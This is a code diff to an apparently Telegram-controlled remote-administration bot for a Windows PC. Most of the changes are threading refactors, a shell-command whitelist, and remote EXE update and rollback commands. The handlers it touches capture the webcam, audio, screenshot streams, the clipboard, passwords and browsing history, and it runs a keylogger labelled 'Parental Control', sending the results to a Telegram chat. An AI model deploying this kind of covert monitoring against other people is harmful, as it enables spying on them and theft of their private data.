@@ -9,6 +9,7 @@ Version: 12.0 (Hardened, Full-Featured & Optimized)
 
 import sys
 import os
+import ast
 import time
 import threading
 import logging
@@ -19,6 +20,7 @@ import psutil
 import io
 import tempfile
 import requests
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from telebot import TeleBot, types
 
@@ -41,7 +43,8 @@ ALLOWED_ROOTS += [os.path.expanduser('~')]
 from config import (
     API_TOKEN, ADMIN_ID, BASE_DIR, BLOCKED_FILE, SETTINGS_FILE,
     BROWSER_PATHS, MAX_WORKERS, logger, AUDIO_AVAILABLE, TTS_AVAILABLE,
-    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN
+    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN,
+    NAS_WEBDAV_URL, NAS_WEBDAV_USER, NAS_WEBDAV_PASS
 )
 
 from utils import (
@@ -76,11 +79,20 @@ config = {
 
 AUDIT_FILE = os.path.join(BASE_DIR, "audit.log")
 
-bot = TeleBot(API_TOKEN)
+bot = TeleBot(API_TOKEN, num_threads=8)
 bot_stats = BotStats()
 monitor = None
-upload_state = {}
-active_streams = {}   # chat_id -> threading.Event (stop flag)
+upload_state    = {}
+_pending_update = {}  # chat_id -> {'new': tmp_exe_path, 'exe': current_exe_path}
+active_streams  = {}  # chat_id -> {'event': threading.Event, 'thread': Thread, 'count': int}
+_streams_lock   = threading.Lock()  # Synchronize active_streams access
+_upload_lock    = threading.Lock()  # Synchronize upload_state access
+_pending_lock   = threading.Lock()  # Synchronize _pending_update access
+_EXIT_REASON_FILE = os.path.join(BASE_DIR, '.exit_reason')  # For watchdog exit tracking
+_UPDATE_BACKUP_FILE = os.path.join(BASE_DIR, '.update_backup')
+
+# Thread pool for fire-and-forget tasks (avoids spawning a new thread per command)
+_executor = ThreadPoolExecutor(max_workers=12, thread_name_prefix="botworker")
 
 # Load data & restore persisted state
 BLOCKED_DATA = load_blocked_list(BLOCKED_FILE)
@@ -110,6 +122,93 @@ def _save_state():
 def audit(cmd, uid=ADMIN_ID):
     """One-liner wrapper to append an audit log entry"""
     append_audit_log(AUDIT_FILE, cmd, uid)
+
+
+def _write_exit_reason(reason: str):
+    """Write exit reason to file for watchdog to read"""
+    try:
+        import json
+        with open(_EXIT_REASON_FILE, 'w', encoding='utf-8') as f:
+            json.dump({'reason': reason, 'timestamp': time.time()}, f)
+    except Exception as e:
+        logger.warning(f"Failed to write exit reason: {e}")
+
+
+def _get_stream(cid):
+    """Thread-safe getter for stream state"""
+    with _streams_lock:
+        return active_streams.get(cid)
+
+
+def _set_stream(cid, event, thread):
+    """Thread-safe setter for stream state"""
+    with _streams_lock:
+        active_streams[cid] = {'event': event, 'thread': thread, 'count': 0}
+
+
+def _del_stream(cid):
+    """Thread-safe deleter for stream state"""
+    with _streams_lock:
+        active_streams.pop(cid, None)
+
+
+def _is_stream_alive(cid):
+    """Check if stream thread is actually alive"""
+    with _streams_lock:
+        state = active_streams.get(cid)
+        if state:
+            return state['thread'].is_alive()
+    return False
+
+
+def _get_upload_state(cid):
+    """Thread-safe getter for upload state"""
+    with _upload_lock:
+        state = upload_state.get(cid)
+        if not state:
+            return None
+        created_at = float(state.get('created_at', 0))
+        if created_at and (time.time() - created_at > 30):
+            upload_state.pop(cid, None)
+            logger.info(f"Upload state expired for chat {cid}")
+            return None
+        return state.get('path')
+
+
+def _set_upload_state(cid, path):
+    """Thread-safe setter for upload state"""
+    with _upload_lock:
+        upload_state[cid] = {'path': path, 'created_at': time.time()}
+
+
+def _del_upload_state(cid):
+    """Thread-safe deleter for upload state"""
+    with _upload_lock:
+        upload_state.pop(cid, None)
+
+
+def _get_pending_update(cid):
+    """Thread-safe getter for pending update"""
+    with _pending_lock:
+        return _pending_update.get(cid)
+
+
+def _set_pending_update(cid, data):
+    """Thread-safe setter for pending update"""
+    with _pending_lock:
+        _pending_update[cid] = data
+
+
+def _del_pending_update(cid):
+    """Thread-safe deleter for pending update"""
+    with _pending_lock:
+        _pending_update.pop(cid, None)
+
+
+def _pop_pending_update(cid):
+    """Thread-safe pop for pending update (atomic get+delete)."""
+    with _pending_lock:
+        return _pending_update.pop(cid, None)
 
 # ==============================================================================
 # BOT MENUS
@@ -178,6 +277,10 @@ def help_handler(m):
         "/cmdlist — Lệnh shell hợp lệ\n"
         "/clipmon — Toggle clipboard monitor\n"
         "/reload — Tải lại .env\n"
+        "/restart — Khởi động lại bot \n"
+        "/update [url] — Update EXE từ NAS/URL\n"
+        "/rollback — Rollback EXE cũ sau update\n"
+        "/cancel — Hủy thao tác đang chờ\n"
         "/stop — Tắt bot + watchdog (không restart)\n"
         "/auditlog [N] — Xem N dòng audit log\n"
         "/help — Trợ giúp"
@@ -212,8 +315,12 @@ def _setup_bot_commands():
             BotCommand("cmd",      "Chạy lệnh shell"),
             BotCommand("volume",   "Âm lượng hệ thống [0-100|up|down|max|mute]"),
             BotCommand("cmdlist",  "Danh sách lệnh shell hợp lệ"),
-            BotCommand("reload",   "Tải lại config .env"),
-            BotCommand("stop",     "Tắt bot và watchdog hoàn toàn"),
+            BotCommand("reload",    "Tải lại config .env"),
+            BotCommand("restart",   "Khởi động lại bot "),
+            BotCommand("update",    "Update EXE từ NAS/URL [url]"),
+            BotCommand("rollback",  "Rollback về EXE cũ sau update"),
+            BotCommand("cancel",    "Hủy thao tác đang chờ"),
+            BotCommand("stop",      "Tắt bot và watchdog hoàn toàn"),
             BotCommand("auditlog", "Xem audit log [N dòng]"),
             BotCommand("help",     "Trợ giúp"),
         ]
@@ -232,62 +339,65 @@ def check_status(m):
     """Rich /status dashboard"""
     if m.from_user.id != ADMIN_ID:
         return
-    
-    try:
-        s = bot_stats.get_stats()
-        # Disk info
-        disk_lines = []
-        for part in psutil.disk_partitions(all=False):
-            try:
-                du = psutil.disk_usage(part.mountpoint)
-                disk_lines.append(
-                    f"  {part.device}: {du.used/1e9:.1f}/{du.total/1e9:.1f}GB "
-                    f"({du.percent}%)"
-                )
-            except Exception:
-                pass
-        # Battery
-        batt = psutil.sensors_battery()
-        if batt:
-            batt_str = f"{batt.percent:.0f}% {'🔌' if batt.power_plugged else '🔋'}"
-        else:
-            batt_str = "N/A"
-        # Network IO
-        nio = psutil.net_io_counters()
-        # Local IP
+
+    def task():
         try:
-            local_ip = socket.gethostbyname(socket.gethostname())
-        except Exception:
-            local_ip = "?"
-        # OS
-        os_info = f"{platform.system()} {platform.release()}"
+            s = bot_stats.get_stats()
+            # Disk info
+            disk_lines = []
+            for part in psutil.disk_partitions(all=False):
+                try:
+                    du = psutil.disk_usage(part.mountpoint)
+                    disk_lines.append(
+                        f"  {part.device}: {du.used/1e9:.1f}/{du.total/1e9:.1f}GB "
+                        f"({du.percent}%)"
+                    )
+                except Exception:
+                    pass
+            # Battery
+            batt = psutil.sensors_battery()
+            if batt:
+                batt_str = f"{batt.percent:.0f}% {'🔌' if batt.power_plugged else '🔋'}"
+            else:
+                batt_str = "N/A"
+            # Network IO
+            nio = psutil.net_io_counters()
+            # Local IP
+            try:
+                local_ip = socket.gethostbyname(socket.gethostname())
+            except Exception:
+                local_ip = "?"
+            # OS
+            os_info = f"{platform.system()} {platform.release()}"
 
-        flags_line = (
-            f"Chặn={'✅' if block_mode_active else '❌'}  "
-            f"TaskMgr={'🔴' if taskmgr_locked else '🟢'}  "
-            f"Xâm={'🟢' if intrusion_alert_active else '❌'}  "
-            f"Clip={'🟢' if clipboard_monitor_on else '❌'}"
-        )
+            flags_line = (
+                f"Chặn={'✅' if block_mode_active else '❌'}  "
+                f"TaskMgr={'🔴' if taskmgr_locked else '🟢'}  "
+                f"Xâm={'🟢' if intrusion_alert_active else '❌'}  "
+                f"Clip={'🟢' if clipboard_monitor_on else '❌'}"
+            )
 
-        msg = (
-            f"🖥️ **STATUS DASHBOARD**\n"
-            f"🕐 Uptime: {s['uptime']}\n"
-            f"💻 Host: {platform.node()} | IP: `{local_ip}`\n"
-            f"🖥️ OS: {os_info}\n"
-            f"🧠 CPU: {s['cpu']}%  💾 RAM: {s['ram']}%\n"
-            f"🔋 Battery: {batt_str}\n"
-            f"📤 Net: ↑{nio.bytes_sent/1e6:.1f}MB ↓{nio.bytes_recv/1e6:.1f}MB\n"
-            f"⚙️ Processes: {s['process_count']}\n"
-            f"📡 Cmds run: {s['commands']}\n"
-            f"💿 Disks:\n" + "\n".join(disk_lines) + "\n"
-            f"🚩 Flags: {flags_line}"
-        )
-        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
-        bot_stats.increment_command()
-        audit("/status", m.from_user.id)
-    except Exception as e:
-        logger.error(f"check_status failed: {e}")
-        bot.reply_to(m, f"❌ Error: {e}")
+            msg = (
+                f"🖥️ **STATUS DASHBOARD**\n"
+                f"🕐 Uptime: {s['uptime']}\n"
+                f"💻 Host: {platform.node()} | IP: `{local_ip}`\n"
+                f"🖥️ OS: {os_info}\n"
+                f"🧠 CPU: {s['cpu']}%  💾 RAM: {s['ram']}%\n"
+                f"🔋 Battery: {batt_str}\n"
+                f"📤 Net: ↑{nio.bytes_sent/1e6:.1f}MB ↓{nio.bytes_recv/1e6:.1f}MB\n"
+                f"⚙️ Processes: {s['process_count']}\n"
+                f"📡 Cmds run: {s['commands']}\n"
+                f"💿 Disks:\n" + "\n".join(disk_lines) + "\n"
+                f"🚩 Flags: {flags_line}"
+            )
+            bot.send_message(m.chat.id, msg, parse_mode="Markdown")
+            bot_stats.increment_command()
+            audit("/status", m.from_user.id)
+        except Exception as e:
+            logger.error(f"check_status failed: {e}")
+            bot.send_message(m.chat.id, f"❌ Error: {e}")
+
+    _executor.submit(task)
 
 @bot.message_handler(commands=['stats'])
 def show_stats(m):
@@ -363,7 +473,7 @@ def h_pass(m):
             logger.error(f"h_pass failed: {e}")
             bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
     
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "🌐 Lịch Sử Web")
 def h_history_menu(m):
@@ -396,7 +506,7 @@ def h_history_menu(m):
             logger.error(f"h_history_menu failed: {e}")
             bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
     
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 # ==============================================================================
 # MEDIA CAPTURE
@@ -404,21 +514,24 @@ def h_history_menu(m):
 
 @bot.message_handler(func=lambda m: m.text == "🖼 Chụp Màn Hình")
 def h_scr(m):
-    """Screenshot"""
+    """Screenshot — runs in executor to avoid blocking polling thread"""
     if m.from_user.id != ADMIN_ID:
         return
-    
-    try:
-        img_data = smart_screenshot()
-        if img_data:
-            bio = io.BytesIO(img_data)
-            bio.name = "screenshot.png"
-            bot.send_document(m.chat.id, bio, caption="🖼 Screenshot")
-            bot_stats.increment_command()
-        else:
-            bot.send_message(m.chat.id, "❌ Lỗi chụp màn hình")
-    except Exception as e:
-        logger.error(f"h_scr failed: {e}")
+
+    def task():
+        try:
+            img_data = smart_screenshot()
+            if img_data:
+                bio = io.BytesIO(img_data)
+                bio.name = "screenshot.png"
+                bot.send_document(m.chat.id, bio, caption="🖼 Screenshot")
+                bot_stats.increment_command()
+            else:
+                bot.send_message(m.chat.id, "❌ Lỗi chụp màn hình")
+        except Exception as e:
+            logger.error(f"h_scr failed: {e}")
+
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "📸 Webcam")
 def h_cam(m):
@@ -426,50 +539,59 @@ def h_cam(m):
     if m.from_user.id != ADMIN_ID:
         return
     
-    try:
-        # Temporarily disable intrusion alert if active
-        global intrusion_alert_active
-        wa = intrusion_alert_active
-        if wa:
-            intrusion_alert_active = False
-            time.sleep(1)
-        
-        img_data = capture_webcam()
-        if img_data:
-            bot.send_photo(m.chat.id, img_data)
-            bot_stats.increment_command()
-        else:
-            bot.send_message(m.chat.id, "❌ Lỗi webcam")
-        
-        if wa:
-            intrusion_alert_active = True
-    except Exception as e:
-        logger.error(f"h_cam failed: {e}")
+    def task():
+        try:
+            # Temporarily disable intrusion alert if active
+            global intrusion_alert_active
+            wa = intrusion_alert_active
+            if wa:
+                intrusion_alert_active = False
+                if monitor:
+                    monitor.update_flags(intrusion_alert=False)
+                time.sleep(0.5)  # wait up to one intrusion frame interval (0.3s) + margin
+            
+            img_data = capture_webcam()
+            if img_data:
+                bot.send_photo(m.chat.id, img_data)
+                bot_stats.increment_command()
+            else:
+                bot.send_message(m.chat.id, "❌ Lỗi webcam")
+
+            if wa:
+                intrusion_alert_active = True
+                if monitor:
+                    monitor.update_flags(intrusion_alert=True)
+        except Exception as e:
+            logger.error(f"h_cam failed: {e}")
+
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "🎤 Ghi Âm (10s)")
 def h_aud(m):
     """Record audio"""
     if m.from_user.id != ADMIN_ID:
         return
-    
+
     if not AUDIO_AVAILABLE:
         bot.send_message(m.chat.id, "❌ Thiếu Audio Driver")
         return
-    
+
     def task():
+        fname = os.path.join(BASE_DIR, "rec.wav")
         try:
             bot.send_message(m.chat.id, "🎙 Ghi âm...")
-            if record_audio(10, "rec.wav"):
-                with open("rec.wav", 'rb') as f:
+            if record_audio(10, fname):
+                with open(fname, 'rb') as f:
                     bot.send_voice(m.chat.id, f)
-                cleanup_media_file("rec.wav")
+                cleanup_media_file(fname)
                 bot_stats.increment_command()
             else:
                 bot.send_message(m.chat.id, "❌ Lỗi ghi âm")
         except Exception as e:
             logger.error(f"h_aud task failed: {e}")
+            cleanup_media_file(fname)
     
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "🎥 Quay MH (10s)")
 def h_vid(m):
@@ -509,10 +631,9 @@ def _do_record_screen(m, secs):
             logger.error(f"record screen task failed: {e}")
         finally:
             cleanup_media_file(tmp)
-            # also clean any .avi fallback
             cleanup_media_file(os.path.splitext(tmp)[0] + '.avi')
 
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 @bot.message_handler(commands=['audio'])
 def h_aud_custom(m):
@@ -543,7 +664,7 @@ def h_aud_custom(m):
             logger.error(f"h_aud_custom task failed: {e}")
             cleanup_media_file(fname)
 
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 # ==============================================================================
 # BLOCKING & CONTROL
@@ -781,32 +902,34 @@ def cmd_ps(m):
 
 def _do_ps(m, filter_str=None):
     """Shared process list logic with optional name filter"""
-    try:
-        procs = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
-        if filter_str:
-            procs = [p for p in procs if filter_str in (p.get('name') or '').lower()]
-        procs.sort(key=lambda x: x.get('cpu_percent') or 0, reverse=True)
-        procs = procs[:20]
+    def task():
+        try:
+            procs = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
+            if filter_str:
+                procs = [p for p in procs if filter_str in (p.get('name') or '').lower()]
+            procs.sort(key=lambda x: x.get('cpu_percent') or 0, reverse=True)
+            procs = procs[:20]
 
-        if not procs:
-            bot.send_message(m.chat.id, f"ℹ️ Không tìm thấy tiến trình nào khớp: `{filter_str}`",
-                             parse_mode="Markdown")
-            return
+            if not procs:
+                bot.send_message(m.chat.id, f"ℹ️ Không tìm thấy tiến trình nào khớp: `{filter_str}`",
+                                 parse_mode="Markdown")
+                return
 
-        header = f"⚙️ **{'TOP 20' if not filter_str else 'Lọc: ' + filter_str.upper()} PROCESS**\n"
-        lines = [
-            f"`{p['pid']:6}` {(p.get('name') or '?')[:25]:25} "
-            f"CPU {p.get('cpu_percent',0):4.1f}%  RAM {p.get('memory_percent',0):.1f}%"
-            for p in procs
-        ]
-        msg = header + "\n".join(lines) + "\n\n/kill <pid>"
-        if len(msg) > 4000:
-            msg = msg[:4000]
-        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
-        bot_stats.increment_command()
-        audit(f"/ps {filter_str or ''}", m.from_user.id)
-    except Exception as e:
-        logger.error(f"_do_ps failed: {e}")
+            header = f"⚙️ **{'TOP 20' if not filter_str else 'Lọc: ' + filter_str.upper()} PROCESS**\n"
+            lines = [
+                f"`{p['pid']:6}` {(p.get('name') or '?')[:25]:25} "
+                f"CPU {p.get('cpu_percent',0):4.1f}%  RAM {p.get('memory_percent',0):.1f}%"
+                for p in procs
+            ]
+            msg = header + "\n".join(lines) + "\n\n/kill <pid>"
+            if len(msg) > 4000:
+                msg = msg[:4000]
+            bot.send_message(m.chat.id, msg, parse_mode="Markdown")
+            bot_stats.increment_command()
+            audit(f"/ps {filter_str or ''}", m.from_user.id)
+        except Exception as e:
+            logger.error(f"_do_ps failed: {e}")
+    _executor.submit(task)
 
 @bot.message_handler(commands=['disk'])
 def cmd_disk(m):
@@ -857,42 +980,46 @@ def cmd_net(m):
     """/net — network snapshot: interfaces, IO, active TCP connections"""
     if m.from_user.id != ADMIN_ID:
         return
-    try:
-        # Interface addresses
-        lines = ["🌐 **Network Snapshot:**\n**Interfaces:**"]
-        addrs = psutil.net_if_addrs()
-        for iface, addr_list in list(addrs.items())[:8]:
-            ipv4 = [a.address for a in addr_list if a.family.name == 'AF_INET']
-            if ipv4:
-                lines.append(f"  `{iface}`: {', '.join(ipv4)}")
 
-        # IO counters
-        nio = psutil.net_io_counters()
-        lines.append(
-            f"\n**I/O:** ↑{nio.bytes_sent/1e6:.1f}MB  ↓{nio.bytes_recv/1e6:.1f}MB  "
-            f"Pkts ↑{nio.packets_sent}  ↓{nio.packets_recv}"
-        )
+    def task():
+        try:
+            # Interface addresses
+            lines = ["🌐 **Network Snapshot:**\n**Interfaces:**"]
+            addrs = psutil.net_if_addrs()
+            for iface, addr_list in list(addrs.items())[:8]:
+                ipv4 = [a.address for a in addr_list if a.family.name == 'AF_INET']
+                if ipv4:
+                    lines.append(f"  `{iface}`: {', '.join(ipv4)}")
 
-        # Active TCP connections (ESTABLISHED only, first 15)
-        lines.append("\n**TCP Connections (ESTABLISHED):**")
-        conns = [c for c in psutil.net_connections(kind='tcp') if c.status == 'ESTABLISHED']
-        conns.sort(key=lambda c: c.raddr.port if c.raddr else 0)
-        for c in conns[:15]:
-            raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "?"
-            try:
-                proc_name = psutil.Process(c.pid).name() if c.pid else "?"
-            except Exception:
-                proc_name = "?"
-            lines.append(f"  {raddr}  [{proc_name}]")
-        if not conns:
-            lines.append("  (không có)")
+            # IO counters
+            nio = psutil.net_io_counters()
+            lines.append(
+                f"\n**I/O:** ↑{nio.bytes_sent/1e6:.1f}MB  ↓{nio.bytes_recv/1e6:.1f}MB  "
+                f"Pkts ↑{nio.packets_sent}  ↓{nio.packets_recv}"
+            )
 
-        bot.send_message(m.chat.id, "\n".join(lines), parse_mode="Markdown")
-        bot_stats.increment_command()
-        audit("/net", m.from_user.id)
-    except Exception as e:
-        logger.error(f"cmd_net failed: {e}")
-        bot.reply_to(m, f"❌ {e}")
+            # Active TCP connections (ESTABLISHED only, first 15)
+            lines.append("\n**TCP Connections (ESTABLISHED):**")
+            conns = [c for c in psutil.net_connections(kind='tcp') if c.status == 'ESTABLISHED']
+            conns.sort(key=lambda c: c.raddr.port if c.raddr else 0)
+            for c in conns[:15]:
+                raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "?"
+                try:
+                    proc_name = psutil.Process(c.pid).name() if c.pid else "?"
+                except Exception:
+                    proc_name = "?"
+                lines.append(f"  {raddr}  [{proc_name}]")
+            if not conns:
+                lines.append("  (không có)")
+
+            bot.send_message(m.chat.id, "\n".join(lines), parse_mode="Markdown")
+            bot_stats.increment_command()
+            audit("/net", m.from_user.id)
+        except Exception as e:
+            logger.error(f"cmd_net failed: {e}")
+            bot.reply_to(m, f"❌ {e}")
+
+    _executor.submit(task)
 
 @bot.message_handler(commands=['events'])
 def cmd_events(m):
@@ -924,7 +1051,7 @@ def cmd_events(m):
         except Exception as e:
             logger.error(f"cmd_events failed: {e}")
             bot.send_message(m.chat.id, f"❌ {e}")
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "🚀 Chạy Lệnh")
 def h_cmd(m):
@@ -947,18 +1074,23 @@ def h_cmd(m):
         logger.error(f"h_cmd failed: {e}")
 
 def process_cmd(m):
-    """Process shell command"""
+    """Process shell command — B1: whitelist enforced same as /cmd"""
     if m.from_user.id != ADMIN_ID:
         return
-    
+
     try:
         if m.text.startswith('/'):
             return
-        
-        # Run command with timeout
-        import subprocess
+
+        # Security: enforce whitelist (same as /cmd handler)
+        first_word = m.text.split()[0].lower() if m.text.split() else ''
+        if first_word not in SHELL_WHITELIST:
+            bot.send_message(m.chat.id,
+                             f"❌ Lệnh `{first_word}` không được phép. Xem /cmdlist",
+                             parse_mode="Markdown")
+            return
+
         result = subprocess.run(m.text, shell=True, capture_output=True, text=True, timeout=10, encoding='cp850', errors='ignore')
-        
         output = result.stdout if result.stdout else "(No output)"
         if len(output) > 4000:
             with open("cmd_output.txt", "w", encoding="utf-8") as f:
@@ -1075,7 +1207,7 @@ def h_say(m):
             logger.error(f"h_say task failed: {e}")
             bot.reply_to(m, f"❌ Lỗi TTS: {e}")
 
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 @bot.message_handler(commands=['msg'])
 def h_msg(m):
@@ -1091,7 +1223,7 @@ def h_msg(m):
         except Exception as e:
             logger.error(f"h_msg task failed: {e}")
     
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 # ==============================================================================
 # WIFI & UTILITIES
@@ -1120,7 +1252,7 @@ def h_wifi(m):
             logger.error(f"h_wifi task failed: {e}")
             bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
     
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "📋 Clipboard")
 def h_clip(m):
@@ -1167,36 +1299,39 @@ def h_clip(m):
 
 @bot.message_handler(func=lambda m: m.text == "📍 Vị Trí IP")
 def h_loc(m):
-    """Get IP location"""
+    """Get IP location — runs in executor to avoid blocking polling thread"""
     if m.from_user.id != ADMIN_ID:
         return
-    
-    try:
-        # B3 fixed: use HTTPS
-        r = requests.get("https://ip-api.com/json/", timeout=5).json()
-        if r.get('status') == 'fail':
-            msg_err = r.get('message', 'unknown error')
-            bot.send_message(m.chat.id, f"❌ IP API lỗi: {msg_err}\nℹ️ Lý do thường gặp: IP private / rate limit (45 req/phút).")
-            return
-        lat = r.get('lat', '')
-        lon = r.get('lon', '')
-        maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat and lon else "N/A"
-        msg = (
-            f"🌍 **Vị Trí IP**\n"
-            f"IP: `{r.get('query', 'N/A')}`\n"
-            f"Quốc gia: {r.get('country', 'N/A')} ({r.get('countryCode', '')})\n"
-            f"Tỉnh/TP: {r.get('regionName', 'N/A')}\n"
-            f"Thành phố: {r.get('city', 'N/A')}\n"
-            f"ISP: {r.get('isp', 'N/A')}\n"
-            f"Org: {r.get('org', 'N/A')}\n"
-            f"Tọa độ: {lat}, {lon}\n"
-            f"🗺 [Google Maps]({maps_link})"
-        )
-        bot.send_message(m.chat.id, msg, parse_mode="Markdown", disable_web_page_preview=True)
-        bot_stats.increment_command()
-    except Exception as e:
-        logger.error(f"h_loc failed: {e}")
-        bot.send_message(m.chat.id, "❌ Lỗi IP")
+
+    def task():
+        try:
+            r = requests.get("https://ipwho.is/", timeout=5).json()
+            if not r.get('success', False):
+                msg_err = r.get('message', 'unknown error')
+                bot.send_message(m.chat.id, f"❌ IP API lỗi: {msg_err}\nℹ️ Lý do thường gặp: IP private / rate limit.")
+                return
+            lat = r.get('latitude', '')
+            lon = r.get('longitude', '')
+            connection = r.get('connection') or {}
+            maps_link = f"https://maps.google.com/?q={lat},{lon}" if lat and lon else "N/A"
+            msg = (
+                f"🌍 **Vị Trí IP**\n"
+                f"IP: `{r.get('ip', 'N/A')}`\n"
+                f"Quốc gia: {r.get('country', 'N/A')} ({r.get('country_code', '')})\n"
+                f"Tỉnh/TP: {r.get('region', 'N/A')}\n"
+                f"Thành phố: {r.get('city', 'N/A')}\n"
+                f"ISP: {connection.get('isp', 'N/A')}\n"
+                f"Org: {connection.get('org', 'N/A')}\n"
+                f"Tọa độ: {lat}, {lon}\n"
+                f"🗺 [Google Maps]({maps_link})"
+            )
+            bot.send_message(m.chat.id, msg, parse_mode="Markdown", disable_web_page_preview=True)
+            bot_stats.increment_command()
+        except Exception as e:
+            logger.error(f"h_loc failed: {e}")
+            bot.send_message(m.chat.id, "❌ Lỗi IP")
+
+    _executor.submit(task)
 
 @bot.message_handler(func=lambda m: m.text == "🧱 Khóa Input")
 def h_blockinput(m):
@@ -1216,7 +1351,7 @@ def h_blockinput(m):
         except Exception as e:
             logger.error(f"h_blockinput task failed: {e}")
 
-    threading.Thread(target=task, daemon=True).start()
+    _executor.submit(task)
 
 # ==============================================================================
 # KEYLOGGER (Parental Control)
@@ -1291,9 +1426,9 @@ def cmd_stream(m):
         return
     parts = m.text.split()
     if len(parts) > 1 and parts[1].lower() == "stop":
-        ev = active_streams.pop(m.chat.id, None)
-        if ev:
-            ev.set()
+        state = _get_stream(m.chat.id)
+        if state:
+            state['event'].set()
             bot.reply_to(m, "🛑 Đã dừng stream.")
         else:
             bot.reply_to(m, "ℹ️ Không có stream nào đang chạy.")
@@ -1304,12 +1439,11 @@ def cmd_stream(m):
     except (ValueError, IndexError):
         interval = 5
 
-    if m.chat.id in active_streams:
+    if _get_stream(m.chat.id):
         bot.reply_to(m, "⚠️ Stream đang chạy. Gửi /stream stop để dừng.")
         return
 
     stop_ev = threading.Event()
-    active_streams[m.chat.id] = stop_ev
 
     def stream_task(cid=m.chat.id, sev=stop_ev, ivl=interval):
         # Inline stop button message
@@ -1319,31 +1453,37 @@ def cmd_stream(m):
             ctrl_msg = bot.send_message(cid,
                 f"📺 Stream bắt đầu | mỗi {ivl}s | /stream stop để dừng",
                 reply_markup=mk)
-        except Exception:
+        except Exception as e:
+            logger.debug(f"stream_task initial message error: {e}")
             ctrl_msg = None
 
         count = 0
-        while not sev.is_set():
-            try:
-                img_data = smart_screenshot()
-                if img_data:
-                    bio = io.BytesIO(img_data)
-                    bio.name = f"stream_{count}.png"
-                    bot.send_photo(cid, bio, caption=f"📺 #{count+1}")
-                    count += 1
-            except Exception as e:
-                logger.debug(f"stream_task send error: {e}")
-            sev.wait(ivl)
+        try:
+            while not sev.is_set():
+                try:
+                    img_data = smart_screenshot()
+                    if img_data:
+                        bio = io.BytesIO(img_data)
+                        bio.name = f"stream_{count}.png"
+                        bot.send_photo(cid, bio, caption=f"📺 #{count+1}")
+                        count += 1
+                except Exception as e:
+                    logger.debug(f"stream_task send error: {e}")
+                sev.wait(ivl)
+        except Exception as e:
+            logger.error(f"stream_task fatal error: {e}")
+        finally:
+            _del_stream(cid)
+            if ctrl_msg:
+                try:
+                    bot.edit_message_text(f"🛑 Stream kết thúc ({count} ảnh)",
+                                          cid, ctrl_msg.message_id)
+                except Exception:
+                    pass
 
-        active_streams.pop(cid, None)
-        if ctrl_msg:
-            try:
-                bot.edit_message_text(f"🛑 Stream kết thúc ({count} ảnh)",
-                                      cid, ctrl_msg.message_id)
-            except Exception:
-                pass
-
-    threading.Thread(target=stream_task, daemon=True).start()
+    stream_thread = threading.Thread(target=stream_task, daemon=True)
+    stream_thread.start()
+    _set_stream(m.chat.id, stop_ev, stream_thread)
     bot.reply_to(m, f"📺 Stream bắt đầu mỗi {interval}s. Dùng /stream stop để dừng.")
     bot_stats.increment_command()
     audit(f"/stream {interval}", m.from_user.id)
@@ -1375,12 +1515,262 @@ def cmd_reload(m):
         config['MONITOR_INTERVAL']    = float(os.getenv("MONITOR_INTERVAL", MONITOR_INTERVAL))
         config['CPU_ALERT_THRESHOLD'] = float(os.getenv("CPU_ALERT_THRESHOLD", CPU_ALERT_THRESHOLD))
         config['CPU_ALERT_COOLDOWN']  = float(os.getenv("CPU_ALERT_COOLDOWN", CPU_ALERT_COOLDOWN))
+        # Refresh NAS credentials so /update picks up new values without restart
+        global NAS_WEBDAV_URL, NAS_WEBDAV_USER, NAS_WEBDAV_PASS
+        NAS_WEBDAV_URL  = os.getenv("NAS_WEBDAV_URL",  NAS_WEBDAV_URL)
+        NAS_WEBDAV_USER = os.getenv("NAS_WEBDAV_USER", NAS_WEBDAV_USER)
+        NAS_WEBDAV_PASS = os.getenv("NAS_WEBDAV_PASS", NAS_WEBDAV_PASS)
         bot_stats.increment_command()
         audit("/reload", m.from_user.id)
         logger.info("Config hot-reloaded from .env")
     except Exception as e:
         logger.error(f"cmd_reload failed: {e}")
         bot.reply_to(m, f"❌ {e}")
+
+@bot.message_handler(commands=['restart'])
+def cmd_restart(m):
+    """/restart — Khởi động lại bot ngay """
+    if m.from_user.id != ADMIN_ID:
+        return
+    
+    mk = types.InlineKeyboardMarkup()
+    mk.add(
+        types.InlineKeyboardButton("✅ Restart Bot", callback_data="restart|confirm"),
+        types.InlineKeyboardButton("❌ Hủy", callback_data="restart|cancel")
+    )
+    bot.reply_to(m,
+        "🔄 **Xác nhận khởi động lại Bot?**\n"
+        "Bot sẽ tắt và watchdog sẽ tự khởi động lại trong vài giây.",
+        reply_markup=mk, parse_mode="Markdown")
+    audit("/restart", m.from_user.id)
+
+# ==============================================================================
+# REMOTE UPDATE (EXE)
+# ==============================================================================
+
+def _write_update_backup(backup_path: str, exe_path: str):
+    """Persist backup info to disk so /rollback works after restart."""
+    try:
+        import json
+        with open(_UPDATE_BACKUP_FILE, 'w', encoding='utf-8') as f:
+            json.dump({'backup': backup_path, 'exe': exe_path}, f)
+    except Exception as e:
